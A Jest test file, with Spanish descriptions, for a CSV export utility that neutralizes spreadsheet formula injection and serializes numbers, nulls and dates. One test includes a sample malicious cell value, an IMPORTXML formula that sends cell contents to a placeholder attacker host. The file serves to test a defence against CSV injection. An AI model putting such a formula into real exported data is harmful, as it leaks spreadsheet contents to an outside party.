import { neutralizeFormula, safeCell } from './csv-cell.util';

describe('neutralizeFormula', () => {
  it.each(['=1+1', '+SUM(A1)', '-2', '@SUM(A1)'])(
    'neutraliza %p, que Excel evaluaría al abrir el archivo',
    (value) => {
      expect(neutralizeFormula(value)).toBe(`'${value}`);
    },
  );

  it('neutraliza el caso real: una respuesta abierta con una fórmula de descarga remota', () => {
    const malicious = '=IMPORTXML(CONCAT("http://atacante/",A1),"//x")';
    expect(neutralizeFormula(malicious).startsWith("'=")).toBe(true);
  });

  it('deja intacto el texto normal', () => {
    expect(neutralizeFormula('Mejorar la comunicación entre áreas')).toBe(
      'Mejorar la comunicación entre áreas',
    );
  });

  it('no toca un número escrito como texto', () => {
    expect(neutralizeFormula('10')).toBe('10');
  });

  it('tolera la cadena vacía', () => {
    expect(neutralizeFormula('')).toBe('');
  });
});

describe('safeCell', () => {
  it('deja pasar los números sin convertirlos a texto', () => {
    expect(safeCell(8)).toBe(8);
    expect(safeCell(0)).toBe(0);
  });

  it('devuelve null para ausencia de valor', () => {
    expect(safeCell(null)).toBeNull();
    expect(safeCell(undefined)).toBeNull();
  });

  it('serializa fechas en ISO', () => {
    expect(safeCell(new Date('2026-08-13T10:00:00.000Z'))).toBe(
      '2026-08-13T10:00:00.000Z',
    );
  });

  it('neutraliza el texto peligroso', () => {
    expect(safeCell('=A1')).toBe("'=A1");
  });
});
